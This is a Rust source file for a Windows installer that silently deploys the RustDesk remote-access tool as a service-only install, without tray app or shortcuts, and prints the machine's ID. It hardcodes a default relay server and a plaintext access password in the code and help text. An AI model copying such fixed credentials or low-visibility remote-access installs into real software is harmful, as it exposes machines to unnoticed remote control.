#[cfg(not(windows))]
fn main() {
    eprintln!("This installer is intended to be built and run on Windows.");
    std::process::exit(1);
}

#[cfg(windows)]
fn main() {
    // MSI payload is injected by build.rs into OUT_DIR.
    const MSI_BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/rustdesk.msi"));

    let mut silent = false;
    let mut id_relay: Option<String> = None;
    let mut access_pass: Option<String> = None;
    let mut conf_pass: Option<String> = None;

    let mut args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--help" || a == "-h" || a == "/?") {
        print_usage();
        return;
    }

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--silent" | "--quiet" | "/S" | "/silent" | "/verysilent" | "/qn" => {
                silent = true;
            }
            "--id-relay" => {
                if i + 1 < args.len() {
                    id_relay = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "--access-pass" => {
                if i + 1 < args.len() {
                    access_pass = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "--conf-pass" => {
                if i + 1 < args.len() {
                    conf_pass = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            _ => {}
        }
        i += 1;
    }

    let id_relay = id_relay.unwrap_or_else(|| "aup.tatnefturs.ru:10201".to_string());
    let access_pass = access_pass.unwrap_or_else(|| "Statusk371037".to_string());
    let conf_pass = conf_pass.unwrap_or_default();

    // Write MSI to a temp file.
    let msi_path = match write_payload_to_temp(MSI_BYTES) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Failed to write MSI payload: {e}");
            std::process::exit(2);
        }
    };

    let exit_code = match run_msiexec(&msi_path, silent, &id_relay, &access_pass, &conf_pass) {
        Ok(code) => code,
        Err(e) => {
            eprintln!("{e}");
            std::process::exit(3);
        }
    };

    // Best effort cleanup of temp MSI.
    let _ = std::fs::remove_file(&msi_path);

    if exit_code != 0 {
        eprintln!("msiexec failed with exit code {exit_code}");
        std::process::exit(exit_code);
    }

    if silent {
        match read_installed_id_file() {
            Ok(Some(id)) => {
                // Print only the ID (so it can be parsed by scripts).
                println!("{id}");
            }
            Ok(None) => {
                eprintln!("Installed, but ID file was not found.");
                std::process::exit(4);
            }
            Err(e) => {
                eprintln!("Installed, but failed to read ID: {e}");
                std::process::exit(5);
            }
        }
    }
}

#[cfg(windows)]
fn print_usage() {
    println!(
        "RustDesk setup (service-only)\\n\\
\\n\\
Usage:\\n\\
  rustdesk-setup.exe [--silent] [--id-relay host:port] [--access-pass pass] [--conf-pass pin]\\n\\
\\n\\
Defaults:\\n\\
  --access-pass Statusk371037\\n\\
  --id-relay   aup.tatnefturs.ru:10201 (relay will be host:(port+3))\\n\\
\\n\\
Silent mode:\\n\\
  Installs as Windows service and prints the generated ID to stdout.\\n"
    );
}

#[cfg(windows)]
fn write_payload_to_temp(bytes: &[u8]) -> std::io::Result<std::path::PathBuf> {
    use std::io::Write;
    let mut path = std::env::temp_dir();
    let pid = std::process::id();
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis();
    path.push(format!("rustdesk-setup-{pid}-{ts}.msi"));
    let mut f = std::fs::File::create(&path)?;
    f.write_all(bytes)?;
    f.flush()?;
    Ok(path)
}

#[cfg(windows)]
fn msi_kv(key: &str, value: &str) -> String {
    // MSI property quoting: PROPERTY="value with spaces".
    // Escape quotes by doubling them.
    let v = value.replace('"', "\"\"");
    format!(r#"{key}="{v}""#)
}

#[cfg(windows)]
fn run_msiexec(
    msi_path: &std::path::Path,
    silent: bool,
    id_relay: &str,
    access_pass: &str,
    conf_pass: &str,
) -> Result<i32, String> {
    use std::process::Command;

    let mut cmd = Command::new("msiexec.exe");
    cmd.arg("/i").arg(msi_path);
    if silent {
        cmd.arg("/qn");
    }
    cmd.arg("/norestart");
    cmd.arg("REBOOT=ReallySuppress");

    // Apply settings (defaults exist in MSI too, but we pass explicitly).
    cmd.arg(msi_kv("ID_RELAY", id_relay));
    cmd.arg(msi_kv("ACCESS_PASS", access_pass));
    if !conf_pass.is_empty() {
        cmd.arg(msi_kv("CONF_PASS", conf_pass));
    }

    // Service-only/minimal footprint.
    cmd.arg("LAUNCH_APP=0");
    cmd.arg("LAUNCH_TRAY_APP=0");
    cmd.arg("STARTUPSHORTCUTS=0");
    cmd.arg("CREATESTARTMENUSHORTCUTS=0");
    cmd.arg("CREATEDESKTOPSHORTCUTS=0");
    cmd.arg("INSTALLPRINTER=0");

    let status = cmd.status().map_err(|e| format!("Failed to start msiexec: {e}"))?;
    Ok(status.code().unwrap_or(1))
}

#[cfg(windows)]
fn read_installed_id_file() -> std::io::Result<Option<String>> {
    // Default install location for our MSI: %ProgramFiles%\\RustDesk\\
    // We write install_id.txt there from the MSI custom action (silent mode).
    let mut base = std::path::PathBuf::from(
        std::env::var_os("ProgramFiles").unwrap_or_else(|| "C:\\\\Program Files".into()),
    );
    base.push("RustDesk");
    base.push("install_id.txt");
    if !base.exists() {
        return Ok(None);
    }
    let s = std::fs::read_to_string(base)?;
    let id = s.trim().to_string();
    if id.is_empty() {
        Ok(None)
    } else {
        Ok(Some(id))
    }
}

